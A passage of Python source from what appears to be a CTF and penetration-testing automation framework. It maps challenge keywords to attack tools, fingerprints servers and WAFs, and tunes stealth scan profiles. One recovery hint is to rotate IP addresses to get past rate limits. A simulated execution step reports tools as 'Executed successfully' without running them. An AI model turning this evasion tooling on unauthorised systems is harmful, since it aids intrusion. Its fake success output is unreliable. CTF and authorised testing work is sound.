            if any(keyword in description_lower for keyword in ["sql", "injection", "database", "mysql", "postgres"]):
                suggested_tools.extend(["sqlmap", "hash-identifier"])
            if any(keyword in description_lower for keyword in ["xss", "script", "javascript", "dom"]):
                suggested_tools.extend(["dalfox", "katana"])
            if any(keyword in description_lower for keyword in ["wordpress", "wp", "cms"]):
                suggested_tools.append("wpscan")
            if any(keyword in description_lower for keyword in ["directory", "hidden", "files", "admin"]):
                suggested_tools.extend(["gobuster", "dirsearch"])
            if any(keyword in description_lower for keyword in ["parameter", "param", "get", "post"]):
                suggested_tools.extend(["arjun", "paramspider"])
            if any(keyword in description_lower for keyword in ["jwt", "token", "session"]):
                suggested_tools.append("jwt-tool")
            if any(keyword in description_lower for keyword in ["graphql", "api"]):
                suggested_tools.append("graphql-voyager")
                
        elif category == "crypto":
            if any(keyword in description_lower for keyword in ["hash", "md5", "sha", "password"]):
                suggested_tools.extend(["hashcat", "john", "hash-identifier"])
            if any(keyword in description_lower for keyword in ["rsa", "public key", "private key", "factorization"]):
                suggested_tools.extend(["rsatool", "factordb", "yafu"])
            if any(keyword in description_lower for keyword in ["cipher", "encrypt", "decrypt", "substitution"]):
                suggested_tools.extend(["cipher-identifier", "frequency-analysis"])
            if any(keyword in description_lower for keyword in ["vigenere", "polyalphabetic"]):
                suggested_tools.append("vigenere-solver")
            if any(keyword in description_lower for keyword in ["base64", "base32", "encoding"]):
                suggested_tools.extend(["base64", "base32"])
            if any(keyword in description_lower for keyword in ["rot", "caesar", "shift"]):
                suggested_tools.append("rot13")
            if any(keyword in description_lower for keyword in ["pgp", "gpg", "signature"]):
                suggested_tools.append("gpg")
                
        elif category == "pwn":
            suggested_tools.extend(["checksec", "file", "strings"])
            
            if any(keyword in description_lower for keyword in ["buffer", "overflow", "bof"]):
                suggested_tools.extend(["pwntools", "gdb-peda", "ropper"])
            if any(keyword in description_lower for keyword in ["format", "printf", "string"]):
                suggested_tools.extend(["pwntools", "gdb-peda"])
            if any(keyword in description_lower for keyword in ["heap", "malloc", "free"]):
                suggested_tools.extend(["pwntools", "gdb-gef"])
            if any(keyword in description_lower for keyword in ["rop", "gadget", "chain"]):
                suggested_tools.extend(["ropper", "ropgadget"])
            if any(keyword in description_lower for keyword in ["shellcode", "exploit"]):
                suggested_tools.extend(["pwntools", "one-gadget"])
            if any(keyword in description_lower for keyword in ["canary", "stack", "protection"]):
                suggested_tools.extend(["checksec", "pwntools"])
                
        elif category == "forensics":
            if any(keyword in description_lower for keyword in ["image", "jpg", "png", "gif", "steganography"]):
                suggested_tools.extend(["exiftool", "steghide", "stegsolve", "zsteg"])
            if any(keyword in description_lower for keyword in ["memory", "dump", "ram"]):
                suggested_tools.extend(["volatility", "volatility3"])
            if any(keyword in description_lower for keyword in ["network", "pcap", "wireshark", "traffic"]):
                suggested_tools.extend(["wireshark", "tcpdump"])
            if any(keyword in description_lower for keyword in ["file", "deleted", "recovery", "carving"]):
                suggested_tools.extend(["binwalk", "foremost", "photorec"])
            if any(keyword in description_lower for keyword in ["disk", "filesystem", "partition"]):
                suggested_tools.extend(["testdisk", "sleuthkit"])
            if any(keyword in description_lower for keyword in ["audio", "wav", "mp3", "sound"]):
                suggested_tools.extend(["audacity", "sonic-visualizer"])
                
        elif category == "rev":
            suggested_tools.extend(["file", "strings", "objdump"])
            
            if any(keyword in description_lower for keyword in ["packed", "upx", "packer"]):
                suggested_tools.extend(["upx", "peid", "detect-it-easy"])
            if any(keyword in description_lower for keyword in ["android", "apk", "mobile"]):
                suggested_tools.extend(["apktool", "jadx", "dex2jar"])
            if any(keyword in description_lower for keyword in [".net", "dotnet", "csharp"]):
                suggested_tools.extend(["dnspy", "ilspy"])
            if any(keyword in description_lower for keyword in ["java", "jar", "class"]):
                suggested_tools.extend(["jd-gui", "jadx"])
            if any(keyword in description_lower for keyword in ["windows", "exe", "dll"]):
                suggested_tools.extend(["ghidra", "ida", "x64dbg"])
            if any(keyword in description_lower for keyword in ["linux", "elf", "binary"]):
                suggested_tools.extend(["ghidra", "radare2", "gdb-peda"])
                
        elif category == "osint":
            if any(keyword in description_lower for keyword in ["username", "social", "media"]):
                suggested_tools.extend(["sherlock", "social-analyzer"])
            if any(keyword in description_lower for keyword in ["domain", "subdomain", "dns"]):
                suggested_tools.extend(["sublist3r", "amass", "dig"])
            if any(keyword in description_lower for keyword in ["email", "harvest", "contact"]):
                suggested_tools.append("theHarvester")
            if any(keyword in description_lower for keyword in ["ip", "port", "service"]):
                suggested_tools.extend(["shodan", "censys"])
            if any(keyword in description_lower for keyword in ["whois", "registration", "owner"]):
                suggested_tools.append("whois")
                
        elif category == "misc":
            if any(keyword in description_lower for keyword in ["qr", "barcode", "code"]):
                suggested_tools.append("qr-decoder")
            if any(keyword in description_lower for keyword in ["zip", "archive", "compressed"]):
                suggested_tools.extend(["zip", "7zip", "rar"])
            if any(keyword in description_lower for keyword in ["brainfuck", "bf", "esoteric"]):
                suggested_tools.append("brainfuck")
            if any(keyword in description_lower for keyword in ["whitespace", "ws"]):
                suggested_tools.append("whitespace")
            if any(keyword in description_lower for keyword in ["piet", "image", "program"]):
                suggested_tools.append("piet")
        
        # Remove duplicates while preserving order
        return list(dict.fromkeys(suggested_tools))

# ============================================================================
# ADVANCED CTF AUTOMATION AND CHALLENGE SOLVING (v8.0 ENHANCEMENT)
# ============================================================================

class CTFChallengeAutomator:
    """Advanced automation system for CTF challenge solving"""
    
    def __init__(self):
        self.active_challenges = {}
        self.solution_cache = {}
        self.learning_database = {}
        self.success_patterns = {}
        
    def auto_solve_challenge(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Attempt to automatically solve a CTF challenge"""
        result = {
            "challenge_id": challenge.name,
            "status": "in_progress",
            "automated_steps": [],
            "manual_steps": [],
            "confidence": 0.0,
            "estimated_completion": 0,
            "artifacts": [],
            "flag_candidates": [],
            "next_actions": []
        }
        
        try:
            # Create workflow
            workflow = ctf_manager.create_ctf_challenge_workflow(challenge)
            
            # Execute automated steps
            for step in workflow["workflow_steps"]:
                if step.get("parallel", False):
                    step_result = self._execute_parallel_step(step, challenge)
                else:
                    step_result = self._execute_sequential_step(step, challenge)
                
                result["automated_steps"].append(step_result)
                
                # Check for flag candidates
                flag_candidates = self._extract_flag_candidates(step_result.get("output", ""))
                result["flag_candidates"].extend(flag_candidates)
                
                # Update confidence based on step success
                if step_result.get("success", False):
                    result["confidence"] += 0.1
                
                # Early termination if flag found
                if flag_candidates and self._validate_flag_format(flag_candidates[0]):
                    result["status"] = "solved"
                    result["flag"] = flag_candidates[0]
                    break
            
            # If not solved automatically, provide manual guidance
            if result["status"] != "solved":
                result["manual_steps"] = self._generate_manual_guidance(challenge, result)
                result["status"] = "needs_manual_intervention"
            
            result["confidence"] = min(1.0, result["confidence"])
            
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            logger.error(f"Error in auto-solve for {challenge.name}: {str(e)}")
        
        return result
    
    def _execute_parallel_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
        """Execute a step with parallel tool execution"""
        step_result = {
            "step": step["step"],
            "action": step["action"],
            "success": False,
            "output": "",
            "tools_used": [],
            "execution_time": 0,
            "artifacts": []
        }
        
        start_time = time.time()
        tools = step.get("tools", [])
        
        # Execute tools in parallel (simulated for now)
        for tool in tools:
            try:
                if tool != "manual":
                    command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
                    # In a real implementation, this would execute the command
                    step_result["tools_used"].append(tool)
                    step_result["output"] += f"[{tool}] Executed successfully\n"
                    step_result["success"] = True
            except Exception as e:
                step_result["output"] += f"[{tool}] Error: {str(e)}\n"
        
        step_result["execution_time"] = time.time() - start_time
        return step_result
    
    def _execute_sequential_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
        """Execute a step sequentially"""
        step_result = {
            "step": step["step"],
            "action": step["action"],
            "success": False,
            "output": "",
            "tools_used": [],
            "execution_time": 0,
            "artifacts": []
        }
        
        start_time = time.time()
        tools = step.get("tools", [])
        
        for tool in tools:
            try:
                if tool == "manual":
                    step_result["output"] += f"[MANUAL] {step['description']}\n"
                    step_result["success"] = True
                elif tool == "custom":
                    step_result["output"] += f"[CUSTOM] Custom implementation required\n"
                    step_result["success"] = True
                else:
                    command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
                    step_result["tools_used"].append(tool)
                    step_result["output"] += f"[{tool}] Command: {command}\n"
                    step_result["success"] = True
            except Exception as e:
                step_result["output"] += f"[{tool}] Error: {str(e)}\n"
        
        step_result["execution_time"] = time.time() - start_time
        return step_result
    
    def _extract_flag_candidates(self, output: str) -> List[str]:
        """Extract potential flags from tool output"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9_]+\{[^}]+\}',
            r'[0-9a-f]{32}',  # MD5 hash
            r'[0-9a-f]{40}',  # SHA1 hash
            r'[0-9a-f]{64}'   # SHA256 hash
        ]
        
        candidates = []
        for pattern in flag_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            candidates.extend(matches)
        
        return list(set(candidates))  # Remove duplicates
    
    def _validate_flag_format(self, flag: str) -> bool:
        """Validate if a string matches common flag formats"""
        common_formats = [
            r'^flag\{.+\}$',
            r'^FLAG\{.+\}$',
            r'^ctf\{.+\}$',
            r'^CTF\{.+\}$',
            r'^[a-zA-Z0-9_]+\{.+\}$'
        ]
        
        for pattern in common_formats:
            if re.match(pattern, flag, re.IGNORECASE):
                return True
        
        return False
    
    def _generate_manual_guidance(self, challenge: CTFChallenge, current_result: Dict[str, Any]) -> List[Dict[str, str]]:
        """Generate manual guidance when automation fails"""
        guidance = []
        
        # Analyze what was attempted
        attempted_tools = []
        for step in current_result["automated_steps"]:
            attempted_tools.extend(step.get("tools_used", []))
        
        # Suggest alternative approaches
        all_category_tools = ctf_tools.get_category_tools(f"{challenge.category}_recon")
        unused_tools = [tool for tool in all_category_tools if tool not in attempted_tools]
        
        if unused_tools:
            guidance.append({
                "action": "try_alternative_tools",
                "description": f"Try these alternative tools: {', '.join(unused_tools[:3])}"
            })
        
        # Category-specific guidance
        if challenge.category == "web":
            guidance.extend([
                {"action": "manual_source_review", "description": "Manually review all HTML/JS source code for hidden comments or clues"},
                {"action": "parameter_fuzzing", "description": "Manually fuzz parameters with custom payloads"},
                {"action": "cookie_analysis", "description": "Analyze cookies and session management"}
            ])
        elif challenge.category == "crypto":
            guidance.extend([
                {"action": "cipher_research", "description": "Research the specific cipher type and known attacks"},
                {"action": "key_analysis", "description": "Analyze key properties and potential weaknesses"},
                {"action": "frequency_analysis", "description": "Perform detailed frequency analysis"}
            ])
        elif challenge.category == "pwn":
            guidance.extend([
                {"action": "manual_debugging", "description": "Manually debug the binary to understand control flow"},
                {"action": "exploit_development", "description": "Develop custom exploit based on vulnerability analysis"},
                {"action": "payload_crafting", "description": "Craft specific payloads for the identified vulnerability"}
            ])
        elif challenge.category == "forensics":
            guidance.extend([
                {"action": "manual_analysis", "description": "Manually analyze file structures and metadata"},
                {"action": "steganography_deep_dive", "description": "Deep dive into steganography techniques"},
                {"action": "timeline_analysis", "description": "Reconstruct detailed timeline of events"}
            ])
        elif challenge.category == "rev":
            guidance.extend([
                {"action": "algorithm_analysis", "description": "Focus on understanding the core algorithm"},
                {"action": "key_extraction", "description": "Extract hardcoded keys or important values"},
                {"action": "dynamic_analysis", "description": "Use dynamic analysis to understand runtime behavior"}
            ])
        
        return guidance

class CTFTeamCoordinator:
    """Coordinate team efforts in CTF competitions"""
    
    def __init__(self):
        self.team_members = {}
        self.challenge_assignments = {}
        self.team_communication = []
        self.shared_resources = {}
        
    def optimize_team_strategy(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> Dict[str, Any]:
        """Optimize team strategy based on member skills and challenge types"""
        strategy = {
            "assignments": {},
            "priority_queue": [],
            "collaboration_opportunities": [],
            "resource_sharing": {},
            "estimated_total_score": 0,
            "time_allocation": {}
        }
        
        # Analyze team skills
        skill_matrix = {}
        for member, skills in team_skills.items():
            skill_matrix[member] = {
                "web": "web" in skills or "webapp" in skills,
                "crypto": "crypto" in skills or "cryptography" in skills,
                "pwn": "pwn" in skills or "binary" in skills,
                "forensics": "forensics" in skills or "investigation" in skills,
                "rev": "reverse" in skills or "reversing" in skills,
                "osint": "osint" in skills or "intelligence" in skills,
                "misc": True  # Everyone can handle misc
            }
        
        # Score challenges for each team member
        member_challenge_scores = {}
        for member in team_skills.keys():
            member_challenge_scores[member] = []
            
            for challenge in challenges:
                base_score = challenge.points
                skill_multiplier = 1.0
                
                if skill_matrix[member].get(challenge.category, False):
                    skill_multiplier = 1.5  # 50% bonus for skill match
                
                difficulty_penalty = {
                    "easy": 1.0,
                    "medium": 0.9,
                    "hard": 0.7,
                    "insane": 0.5,
                    "unknown": 0.8
                }[challenge.difficulty]
                
                final_score = base_score * skill_multiplier * difficulty_penalty
                
                member_challenge_scores[member].append({
                    "challenge": challenge,
                    "score": final_score,
                    "estimated_time": self._estimate_solve_time(challenge, skill_matrix[member])
                })
        
        # Assign challenges using Hungarian algorithm approximation
        assignments = self._assign_challenges_optimally(member_challenge_scores)
        strategy["assignments"] = assignments
        
        # Create priority queue
        all_assignments = []
        for member, challenges in assignments.items():
            for challenge_info in challenges:
                all_assignments.append({
                    "member": member,
                    "challenge": challenge_info["challenge"].name,
                    "priority": challenge_info["score"],
                    "estimated_time": challenge_info["estimated_time"]
                })
        
        strategy["priority_queue"] = sorted(all_assignments, key=lambda x: x["priority"], reverse=True)
        
        # Identify collaboration opportunities
        strategy["collaboration_opportunities"] = self._identify_collaboration_opportunities(challenges, team_skills)
        
        return strategy
    
    def _estimate_solve_time(self, challenge: CTFChallenge, member_skills: Dict[str, bool]) -> int:
        """Estimate solve time for a challenge based on member skills"""
        base_times = {
            "easy": 1800,    # 30 minutes
            "medium": 3600,  # 1 hour
            "hard": 7200,    # 2 hours
            "insane": 14400, # 4 hours
            "unknown": 5400  # 1.5 hours
        }
        
        base_time = base_times[challenge.difficulty]
        
        # Skill bonus
        if member_skills.get(challenge.category, False):
            base_time = int(base_time * 0.7)  # 30% faster with relevant skills
        
        return base_time
    
    def _assign_challenges_optimally(self, member_challenge_scores: Dict[str, List[Dict]]) -> Dict[str, List[Dict]]:
        """Assign challenges to team members optimally"""
        assignments = {member: [] for member in member_challenge_scores.keys()}
        assigned_challenges = set()
        
        # Simple greedy assignment (in practice, would use Hungarian algorithm)
        for _ in range(len(member_challenge_scores)):
            best_assignment = None
            best_score = -1
            
            for member, challenge_scores in member_challenge_scores.items():
                for challenge_info in challenge_scores:
                    challenge_name = challenge_info["challenge"].name
                    if challenge_name not in assigned_challenges:
                        if challenge_info["score"] > best_score:
                            best_score = challenge_info["score"]
                            best_assignment = (member, challenge_info)
            
            if best_assignment:
                member, challenge_info = best_assignment
                assignments[member].append(challenge_info)
                assigned_challenges.add(challenge_info["challenge"].name)
        
        return assignments
    
    def _identify_collaboration_opportunities(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> List[Dict[str, Any]]:
        """Identify challenges that would benefit from team collaboration"""
        collaboration_opportunities = []
        
        for challenge in challenges:
            if challenge.difficulty in ["hard", "insane"]:
                # High-difficulty challenges benefit from collaboration
                relevant_members = []
                for member, skills in team_skills.items():
                    if challenge.category in [skill.lower() for skill in skills]:
                        relevant_members.append(member)
                
                if len(relevant_members) >= 2:
                    collaboration_opportunities.append({
                        "challenge": challenge.name,
                        "recommended_team": relevant_members,
                        "reason": f"High-difficulty {challenge.category} challenge benefits from collaboration"
                    })
        
        return collaboration_opportunities

# ============================================================================
# ADVANCED PARAMETER OPTIMIZATION AND INTELLIGENCE (v9.0 ENHANCEMENT)
# ============================================================================

class TechnologyDetector:
    """Advanced technology detection system for context-aware parameter selection"""
    
    def __init__(self):
        self.detection_patterns = {
            "web_servers": {
                "apache": ["Apache", "apache", "httpd"],
                "nginx": ["nginx", "Nginx"],
                "iis": ["Microsoft-IIS", "IIS"],
                "tomcat": ["Tomcat", "Apache-Coyote"],
                "jetty": ["Jetty"],
                "lighttpd": ["lighttpd"]
            },
            "frameworks": {
                "django": ["Django", "django", "csrftoken"],
                "flask": ["Flask", "Werkzeug"],
                "express": ["Express", "X-Powered-By: Express"],
                "laravel": ["Laravel", "laravel_session"],
                "symfony": ["Symfony", "symfony"],
                "rails": ["Ruby on Rails", "rails", "_session_id"],
                "spring": ["Spring", "JSESSIONID"],
                "struts": ["Struts", "struts"]
            },
            "cms": {
                "wordpress": ["wp-content", "wp-includes", "WordPress", "/wp-admin/"],
                "drupal": ["Drupal", "drupal", "/sites/default/", "X-Drupal-Cache"],
                "joomla": ["Joomla", "joomla", "/administrator/", "com_content"],
                "magento": ["Magento", "magento", "Mage.Cookies"],
                "prestashop": ["PrestaShop", "prestashop"],
                "opencart": ["OpenCart", "opencart"]
            },
            "databases": {
                "mysql": ["MySQL", "mysql", "phpMyAdmin"],
                "postgresql": ["PostgreSQL", "postgres"],
                "mssql": ["Microsoft SQL Server", "MSSQL"],
                "oracle": ["Oracle", "oracle"],
                "mongodb": ["MongoDB", "mongo"],
                "redis": ["Redis", "redis"]
            },
            "languages": {
                "php": ["PHP", "php", ".php", "X-Powered-By: PHP"],
                "python": ["Python", "python", ".py"],
                "java": ["Java", "java", ".jsp", ".do"],
                "dotnet": ["ASP.NET", ".aspx", ".asp", "X-AspNet-Version"],
                "nodejs": ["Node.js", "node", ".js"],
                "ruby": ["Ruby", "ruby", ".rb"],
                "go": ["Go", "golang"],
                "rust": ["Rust", "rust"]
            },
            "security": {
                "waf": ["cloudflare", "CloudFlare", "X-CF-Ray", "incapsula", "Incapsula", "sucuri", "Sucuri"],
                "load_balancer": ["F5", "BigIP", "HAProxy", "nginx", "AWS-ALB"],
                "cdn": ["CloudFront", "Fastly", "KeyCDN", "MaxCDN", "Cloudflare"]
            }
        }
        
        self.port_services = {
            21: "ftp",
            22: "ssh", 
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            143: "imap",
            443: "https",
            993: "imaps",
            995: "pop3s",
            1433: "mssql",
            3306: "mysql",
            5432: "postgresql",
            6379: "redis",
            27017: "mongodb",
            8080: "http-alt",
            8443: "https-alt",
            9200: "elasticsearch",
            11211: "memcached"
        }
    
    def detect_technologies(self, target: str, headers: Dict[str, str] = None, content: str = "", ports: List[int] = None) -> Dict[str, List[str]]:
        """Comprehensive technology detection"""
        detected = {
            "web_servers": [],
            "frameworks": [],
            "cms": [],
            "databases": [],
            "languages": [],
            "security": [],
            "services": []
        }
        
        # Header-based detection
        if headers:
            for category, tech_patterns in self.detection_patterns.items():
                for tech, patterns in tech_patterns.items():
                    for header_name, header_value in headers.items():
                        for pattern in patterns:
                            if pattern.lower() in header_value.lower() or pattern.lower() in header_name.lower():
                                if tech not in detected[category]:
                                    detected[category].append(tech)
        
        # Content-based detection
        if content:
            content_lower = content.lower()
            for category, tech_patterns in self.detection_patterns.items():
                for tech, patterns in tech_patterns.items():
                    for pattern in patterns:
                        if pattern.lower() in content_lower:
                            if tech not in detected[category]:
                                detected[category].append(tech)
        
        # Port-based service detection
        if ports:
            for port in ports:
                if port in self.port_services:
                    service = self.port_services[port]
                    if service not in detected["services"]:
                        detected["services"].append(service)
        
        return detected

class RateLimitDetector:
    """Intelligent rate limiting detection and automatic timing adjustment"""
    
    def __init__(self):
        self.rate_limit_indicators = [
            "rate limit",
            "too many requests",
            "429",
            "throttle",
            "slow down",
            "retry after",
            "quota exceeded",
            "api limit",
            "request limit"
        ]
        
        self.timing_profiles = {
            "aggressive": {"delay": 0.1, "threads": 50, "timeout": 5},
            "normal": {"delay": 0.5, "threads": 20, "timeout": 10},
            "conservative": {"delay": 1.0, "threads": 10, "timeout": 15},
            "stealth": {"delay": 2.0, "threads": 5, "timeout": 30}
        }
    
    def detect_rate_limiting(self, response_text: str, status_code: int, headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Detect rate limiting from response"""
        rate_limit_detected = False
        confidence = 0.0
        indicators_found = []
        
        # Status code check
        if status_code == 429:
            rate_limit_detected = True
            confidence += 0.8
            indicators_found.append("HTTP 429 status")
        
        # Response text check
        response_lower = response_text.lower()
        for indicator in self.rate_limit_indicators:
            if indicator in response_lower:
                rate_limit_detected = True
                confidence += 0.2
                indicators_found.append(f"Text: '{indicator}'")
        
        # Header check
        if headers:
            rate_limit_headers = ["x-ratelimit", "retry-after", "x-rate-limit"]
            for header_name in headers.keys():
                for rl_header in rate_limit_headers:
                    if rl_header.lower() in header_name.lower():
                        rate_limit_detected = True
                        confidence += 0.3
                        indicators_found.append(f"Header: {header_name}")
        
        confidence = min(1.0, confidence)
        
        return {
            "detected": rate_limit_detected,
            "confidence": confidence,
            "indicators": indicators_found,
            "recommended_profile": self._recommend_timing_profile(confidence)
        }
    
    def _recommend_timing_profile(self, confidence: float) -> str:
        """Recommend timing profile based on rate limit confidence"""
        if confidence >= 0.8:
            return "stealth"
        elif confidence >= 0.5:
            return "conservative"
        elif confidence >= 0.2:
            return "normal"
        else:
            return "aggressive"
    
    def adjust_timing(self, current_params: Dict[str, Any], profile: str) -> Dict[str, Any]:
        """Adjust timing parameters based on profile"""
        timing = self.timing_profiles.get(profile, self.timing_profiles["normal"])
        
        adjusted_params = current_params.copy()
        
        # Adjust common parameters
        if "threads" in adjusted_params:
            adjusted_params["threads"] = timing["threads"]
        if "delay" in adjusted_params:
            adjusted_params["delay"] = timing["delay"]
        if "timeout" in adjusted_params:
            adjusted_params["timeout"] = timing["timeout"]
        
        # Tool-specific adjustments
        if "additional_args" in adjusted_params:
            args = adjusted_params["additional_args"]
            
            # Remove existing timing arguments
            args = re.sub(r'-t\s+\d+', '', args)
            args = re.sub(r'--threads\s+\d+', '', args)
            args = re.sub(r'--delay\s+[\d.]+', '', args)
            
            # Add new timing arguments
            args += f" -t {timing['threads']}"
            if timing["delay"] > 0:
                args += f" --delay {timing['delay']}"
            
            adjusted_params["additional_args"] = args.strip()
        
        return adjusted_params

class FailureRecoverySystem:
    """Intelligent failure recovery with alternative tool selection"""
    
    def __init__(self):
        self.tool_alternatives = {
            "nmap": ["rustscan", "masscan", "zmap"],
            "gobuster": ["dirsearch", "feroxbuster", "dirb"],
            "sqlmap": ["sqlninja", "bbqsql", "jsql-injection"],
            "nuclei": ["nikto", "w3af", "skipfish"],
            "hydra": ["medusa", "ncrack", "patator"],
            "hashcat": ["john", "ophcrack", "rainbowcrack"],
            "amass": ["subfinder", "sublist3r", "assetfinder"],
            "ffuf": ["wfuzz", "gobuster", "dirb"]
        }
        
        self.failure_patterns = {
            "timeout": ["timeout", "timed out", "connection timeout"],
            "permission_denied": ["permission denied", "access denied", "forbidden"],
            "not_found": ["not found", "command not found", "no such file"],
            "network_error": ["network unreachable", "connection refused", "host unreachable"],
            "rate_limited": ["rate limit", "too many requests", "throttled"],
            "authentication_required": ["authentication required", "unauthorized", "login required"]
        }
    
    def analyze_failure(self, error_output: str, exit_code: int) -> Dict[str, Any]:
        """Analyze failure and suggest recovery strategies"""
        failure_type = "unknown"
        confidence = 0.0
        recovery_strategies = []
        
        error_lower = error_output.lower()
        
        # Identify failure type
        for failure, patterns in self.failure_patterns.items():
            for pattern in patterns:
                if pattern in error_lower:
                    failure_type = failure
                    confidence += 0.3
                    break
        
        # Exit code analysis
        if exit_code == 1:
            confidence += 0.1
        elif exit_code == 124:  # timeout
            failure_type = "timeout"
            confidence += 0.5
        elif exit_code == 126:  # permission denied
            failure_type = "permission_denied"
            confidence += 0.5
        
        confidence = min(1.0, confidence)
        
        # Generate recovery strategies
        if failure_type == "timeout":
            recovery_strategies = [
                "Increase timeout values",
                "Reduce thread count",
                "Use alternative faster tool",
                "Split target into smaller chunks"
            ]
        elif failure_type == "permission_denied":
            recovery_strategies = [
                "Run with elevated privileges",
                "Check file permissions",
                "Use alternative tool with different approach"
            ]
        elif failure_type == "rate_limited":
            recovery_strategies = [
                "Implement delays between requests",
                "Reduce thread count",
                "Use stealth timing profile",
                "Rotate IP addresses if possible"
            ]
        elif failure_type == "network_error":
            recovery_strategies = [
                "Check network connectivity",
                "Try alternative network routes",
                "Use proxy or VPN",
                "Verify target is accessible"
            ]
        
        return {
            "failure_type": failure_type,
            "confidence": confidence,
            "recovery_strategies": recovery_strategies,
            "alternative_tools": self.tool_alternatives.get(self._extract_tool_name(error_output), [])
        }
    
    def _extract_tool_name(self, error_output: str) -> str:
        """Extract tool name from error output"""
        for tool in self.tool_alternatives.keys():
            if tool in error_output.lower():
                return tool
        return "unknown"

class PerformanceMonitor:
    """Advanced performance monitoring with automatic resource allocation"""
    
    def __init__(self):
        self.performance_metrics = {}
        self.resource_thresholds = {
            "cpu_high": 80.0,
            "memory_high": 85.0,
            "disk_high": 90.0,
            "network_high": 80.0
        }
        
        self.optimization_rules = {
            "high_cpu": {
                "reduce_threads": 0.5,
                "increase_delay": 2.0,
                "enable_nice": True
            },
            "high_memory": {
                "reduce_batch_size": 0.6,
                "enable_streaming": True,
                "clear_cache": True
            },
            "high_disk": {
                "reduce_output_verbosity": True,
                "enable_compression": True,
                "cleanup_temp_files": True
            },
            "high_network": {
                "reduce_concurrent_connections": 0.7,
                "increase_timeout": 1.5,
                "enable_connection_pooling": True
            }
        }
    
    def monitor_system_resources(self) -> Dict[str, float]:
        """Monitor current system resource usage"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()
            
            return {
                "cpu_percent": cpu_percent,
                "memory_percent": memory.percent,
                "disk_percent": disk.percent,
                "network_bytes_sent": network.bytes_sent,
                "network_bytes_recv": network.bytes_recv,
                "timestamp": time.time()
            }
        except Exception as e:
            logger.error(f"Error monitoring system resources: {str(e)}")
            return {}
    
    def optimize_based_on_resources(self, current_params: Dict[str, Any], resource_usage: Dict[str, float]) -> Dict[str, Any]:
        """Optimize parameters based on current resource usage"""
        optimized_params = current_params.copy()
        optimizations_applied = []
        
        # CPU optimization
        if resource_usage.get("cpu_percent", 0) > self.resource_thresholds["cpu_high"]:
            if "threads" in optimized_params:
                original_threads = optimized_params["threads"]
                optimized_params["threads"] = max(1, int(original_threads * self.optimization_rules["high_cpu"]["reduce_threads"]))
                optimizations_applied.append(f"Reduced threads from {original_threads} to {optimized_params['threads']}")
            
            if "delay" in optimized_params:
                original_delay = optimized_params.get("delay", 0)
                optimized_params["delay"] = original_delay * self.optimization_rules["high_cpu"]["increase_delay"]
                optimizations_applied.append(f"Increased delay to {optimized_params['delay']}")
        
        # Memory optimization
        if resource_usage.get("memory_percent", 0) > self.resource_thresholds["memory_high"]:
            if "batch_size" in optimized_params:
                original_batch = optimized_params["batch_size"]
                optimized_params["batch_size"] = max(1, int(original_batch * self.optimization_rules["high_memory"]["reduce_batch_size"]))
                optimizations_applied.append(f"Reduced batch size from {original_batch} to {optimized_params['batch_size']}")
        
        # Network optimization
        if "network_bytes_sent" in resource_usage:
            # Simple heuristic for high network usage
            if resource_usage["network_bytes_sent"] > 1000000:  # 1MB/s
                if "concurrent_connections" in optimized_params:
                    original_conn = optimized_params["concurrent_connections"]
                    optimized_params["concurrent_connections"] = max(1, int(original_conn * self.optimization_rules["high_network"]["reduce_concurrent_connections"]))
                    optimizations_applied.append(f"Reduced concurrent connections to {optimized_params['concurrent_connections']}")
        
        optimized_params["_optimizations_applied"] = optimizations_applied
        return optimized_params

class ParameterOptimizer:
    """Advanced parameter optimization system with intelligent context-aware selection"""
    
    def __init__(self):
        self.tech_detector = TechnologyDetector()
        self.rate_limiter = RateLimitDetector()
        self.failure_recovery = FailureRecoverySystem()
        self.performance_monitor = PerformanceMonitor()
        
        # Tool-specific optimization profiles
        self.optimization_profiles = {
            "nmap": {
                "stealth": {
                    "scan_type": "-sS",
                    "timing": "-T2",
                    "additional_args": "--max-retries 1 --host-timeout 300s"
                },
                "normal": {
                    "scan_type": "-sS -sV",
                    "timing": "-T4",
                    "additional_args": "--max-retries 2"
                },
                "aggressive": {
                    "scan_type": "-sS -sV -sC -O",
                    "timing": "-T5",
                    "additional_args": "--max-retries 3 --min-rate 1000"
                }
            },
            "gobuster": {
                "stealth": {
                    "threads": 5,
                    "delay": "1s",
                    "timeout": "30s"
                },
                "normal": {
                    "threads": 20,
                    "delay": "0s",
                    "timeout": "10s"
                },
                "aggressive": {
                    "threads": 50,
                    "delay": "0s",
                    "timeout": "5s"
                }
            },
            "sqlmap": {
                "stealth": {
                    "level": 1,
                    "risk": 1,
                    "threads": 1,
                    "delay": 1
                },
                "normal": {
                    "level": 2,
                    "risk": 2,
                    "threads": 5,
                    "delay": 0
                },
                "aggressive": {
                    "level": 3,
                    "risk": 3,
                    "threads": 10,
                    "delay": 0
                }
            }
        }
    
    def optimize_parameters_advanced(self, tool: str, target_profile: TargetProfile, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """Advanced parameter optimization with full intelligence"""
        if context is None:
            context = {}
        
        # Get base parameters
        base_params = self._get_base_parameters(tool, target_profile)
        
        # Detect technologies for context-aware optimization
        detected_tech = self.tech_detector.detect_technologies(
            target_profile.target,
            headers=context.get("headers", {}),
            content=context.get("content", ""),
            ports=target_profile.open_ports
        )
        
        # Apply technology-specific optimizations
        tech_optimized_params = self._apply_technology_optimizations(tool, base_params, detected_tech)
        
        # Monitor system resources and optimize accordingly
        resource_usage = self.performance_monitor.monitor_system_resources()
        resource_optimized_params = self.performance_monitor.optimize_based_on_resources(tech_optimized_params, resource_usage)
        
        # Apply profile-based optimizations
        profile = context.get("optimization_profile", "normal")
